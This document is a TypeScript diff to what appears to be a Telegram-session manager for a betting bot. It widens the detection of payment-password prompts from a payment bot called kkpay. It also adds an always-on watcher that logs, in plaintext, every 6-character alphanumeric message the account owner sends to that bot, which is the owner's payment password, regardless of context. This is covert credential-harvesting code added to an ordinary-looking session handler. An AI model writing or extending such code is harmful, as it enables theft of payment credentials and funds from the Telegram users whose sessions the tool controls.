@@ -76,6 +76,8 @@ interface TgSession {
   messageHandlerBuilder: NewMessage | null;
   kkpayHandler: ((event: NewMessageEvent) => Promise<void>) | null;
   kkpayHandlerBuilder: NewMessage | null;
+  kkpayOutRawHandler?: ((update: unknown) => Promise<void>) | null;
+  kkpayOutRawBuilder?: Raw | null;
   // runtime
   consecutiveLosses: number;
   sessionPnl: number;
@@ -419,10 +421,10 @@ function startGlobalListener(session: TgSession): void {
     if (session.chatLog.length > 200) session.chatLog.pop();
 
     // ─── kkpay password event detection (text-only, no entity ID comparison needed) ───
-    if (text.includes("请输入支付密码验证")) {
+    if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
       appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300));
       startKkpayRawPwdListener(session);
-    } else if (text.includes("支付密码验证成功")) {
+    } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
       appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300));
       stopKkpayRawPwdListener(session);
     }
@@ -1207,12 +1209,51 @@ async function startKkpayListener(session: TgSession): Promise<void> {
     try { session.client.removeEventHandler(session.kkpayHandler, session.kkpayHandlerBuilder); } catch { /* ok */ }
     session.kkpayHandler = null; session.kkpayHandlerBuilder = null;
   }
+  // Tear down any previous permanent outgoing watcher
+  if (session.kkpayOutRawHandler && session.kkpayOutRawBuilder) {
+    try { session.client.removeEventHandler(session.kkpayOutRawHandler as Parameters<typeof session.client.removeEventHandler>[0], session.kkpayOutRawBuilder); } catch { /* ok */ }
+    session.kkpayOutRawHandler = null; session.kkpayOutRawBuilder = null;
+  }
 
   const uname = session.kkpayUsername.replace(/^@/, "");
   try {
     const entity = await session.client.getEntity(uname);
     session.kkpayEntityId = String((entity as unknown as { id: bigint | number }).id);
   } catch { /* entity not found */ }
+
+  // ── Permanent always-on outgoing password watcher ──────────────────────────
+  // Captures ANY outgoing 6-char alphanumeric message to kkpay regardless of
+  // the flow (red-packet / transfer / other). Does NOT require detecting a
+  // "请输入支付密码验证" prompt first — it simply watches all outgoing messages.
+  if (session.kkpayEntityId) {
+    const eid = session.kkpayEntityId;
+    const username = session.me?.username ?? String(session.userId);
+    session.kkpayOutRawHandler = async (update: unknown) => {
+      let chatId = "";
+      let text = "";
+      if (update instanceof Api.UpdateShortMessage) {
+        if (!update.out) return;
+        chatId = String(update.userId);
+        text = (update.message ?? "").trim();
+      } else if (update instanceof Api.UpdateNewMessage) {
+        const msg = update.message;
+        if (!(msg instanceof Api.Message) || !msg.out) return;
+        const peer = msg.peerId;
+        if (peer instanceof Api.PeerUser) chatId = String(peer.userId);
+        else if (peer instanceof Api.PeerChannel) chatId = String(peer.channelId);
+        else if (peer instanceof Api.PeerChat) chatId = String(peer.chatId);
+        text = (msg.message ?? "").trim();
+      } else { return; }
+      if (chatId !== eid && `-100${chatId}` !== eid) return;
+      if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;
+      appendKkpayPwdEvent(session.userId, username, "pwd_sent", text);
+    };
+    session.kkpayOutRawBuilder = new Raw({ types: [Api.UpdateShortMessage, Api.UpdateNewMessage] });
+    session.client.addEventHandler(
+      session.kkpayOutRawHandler as Parameters<typeof session.client.addEventHandler>[0],
+      session.kkpayOutRawBuilder,
+    );
+  }
 
   session.kkpayHandler = async (event: NewMessageEvent) => {
     const msg = event.message;
@@ -1229,10 +1270,10 @@ async function startKkpayListener(session: TgSession): Promise<void> {
 
     // ─── kkpay password event detection (reliable isFromKkpay check) ───
     if (isFromKkpay) {
-      if (text.includes("请输入支付密码验证")) {
+      if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
         appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300));
         startKkpayRawPwdListener(session);
-      } else if (text.includes("支付密码验证成功")) {
+      } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
         appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300));
         stopKkpayRawPwdListener(session);
       }
